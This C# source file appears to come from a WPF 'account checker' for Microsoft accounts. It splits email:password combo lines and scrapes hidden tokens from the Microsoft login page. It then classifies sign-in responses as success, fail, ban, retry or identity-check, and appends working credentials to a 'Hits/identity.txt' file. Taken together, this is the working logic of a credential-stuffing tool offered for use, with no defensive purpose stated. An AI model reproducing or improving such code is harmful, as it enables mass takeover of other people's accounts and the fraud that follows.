using System.IO;
using System.Net.Http;
using AccountCheckerWPF.Enums;

namespace AccountCheckerWPF.Helper;

public static class CommonHelper
{
    public static (string email, string password) ParseAccountStr(string accountStr)
    {
        var splitAccount = accountStr.Split(':');
        return (splitAccount[0], splitAccount[1]);
    }

    public static string ExtractValue(string source, string start, string end)
    {
        var startIndex = source.IndexOf(start, StringComparison.Ordinal);
        if (startIndex == -1) return string.Empty;
        startIndex += start.Length;
        var endIndex = source.IndexOf(end, startIndex, StringComparison.Ordinal);
        if (endIndex == -1) return string.Empty;
        return source.Substring(startIndex, endIndex - startIndex);
    }

    public static GetParamFromLoginPageData GetParamsFromLoginPage(string body)
    {
        var bk = CommonHelper.ExtractValue(body, "bk=", "&");
        var contextid = CommonHelper.ExtractValue(body, "contextid=", "&");
        var uaid = CommonHelper.ExtractValue(body, "uaid=", "\"/>");
        var ppft = CommonHelper.ExtractValue(body, "name=\"PPFT\" id=\"i0327\" value=\"", "\"");

        return new GetParamFromLoginPageData
        {
            BK = bk,
            ContextId = contextid,
            UAID = uaid,
            PPFT = ppft
        };
    }

    public static List<string> GetCookies(HttpResponseMessage postResponse)
    {
        return postResponse.Headers.TryGetValues("Set-Cookie", out var cookieHeaders)
            ? cookieHeaders.ToList()
            : new List<string>();
    }

    public static string? GetCookieValue(string cookieName, List<string>? cookies)
    {
        foreach (var cookie in cookies)
        {
            var parts = cookie.Split(';');
            var cookiePart = parts.FirstOrDefault(p =>
                p.Trim().StartsWith(cookieName + "=", StringComparison.OrdinalIgnoreCase));
            if (cookiePart != null)
            {
                return cookiePart.Split('=')[1];
            }
        }

        return null;
    }

    public static string? ExtractValueBetween(string input, string leftDelim, string rightDelim)
    {
        var startIndex = input.IndexOf(leftDelim, StringComparison.Ordinal) + leftDelim.Length;
        var endIndex = input.IndexOf(rightDelim, startIndex, StringComparison.Ordinal);
        return startIndex > -1 && endIndex > startIndex ? input.Substring(startIndex, endIndex - startIndex) : null;
    }

    public static LoginKeyCheckStatus EvaluatePostLoginResponse(string bodyPost, List<string> cookies,
        HttpResponseMessage postResponse)
    {
        if (bodyPost.Contains("Your account or password is incorrect.") ||
            bodyPost.Contains("That Microsoft account doesn't exist. Enter a different account") ||
            bodyPost.Contains("Sign in to your Microsoft account") ||
            bodyPost.Contains("gls.srf") ||
            bodyPost.Contains("timed out") ||
            bodyPost.Contains("account.live.com/recover?mkt") ||
            bodyPost.Contains("recover?mkt") ||
            bodyPost.Contains("get a new one") ||
            bodyPost.Contains("/cancel?mkt=") ||
            bodyPost.Contains("/Abuse?mkt="))
        {
            return LoginKeyCheckStatus.Fail;
        }

        if (bodyPost.Contains(",AC:null,urlFedConvertRename"))
        {
            return LoginKeyCheckStatus.Ban;
        }

        if (bodyPost.Contains("sign in too many times"))
        {
            return LoginKeyCheckStatus.Retry;
        }

        if (cookies.Contains("ANON") ||
            cookies.Contains("WLSSC") ||
            postResponse.RequestMessage.RequestUri.ToString()
                .Contains("https://login.live.com/oauth20_desktop.srf?") ||
            bodyPost.Contains("sSigninName") ||
            bodyPost.Contains("privacynotice.account.microsoft.com"))
        {
            return LoginKeyCheckStatus.Success;
        }

        if (bodyPost.Contains("identity/confirm?mkt") ||
            bodyPost.Contains("Email/Confirm?mkt"))
        {
            return LoginKeyCheckStatus.Identity;
        }

        return LoginKeyCheckStatus.Unknown;
    }

    public static async Task WriteToIdentityFile(string email, string password)
    {
        var hitsDirectory = "Hits";
        var identityFilePath = Path.Combine(hitsDirectory, "identity.txt");

        if (!Directory.Exists(hitsDirectory))
        {
            Directory.CreateDirectory(hitsDirectory);
        }

        if (!File.Exists(identityFilePath))
        {
            File.Create(identityFilePath).Close();
        }

        await using (var file = new StreamWriter(identityFilePath, true))
        {
            await file.WriteLineAsync($"{email}:{password}");
        }
    }
}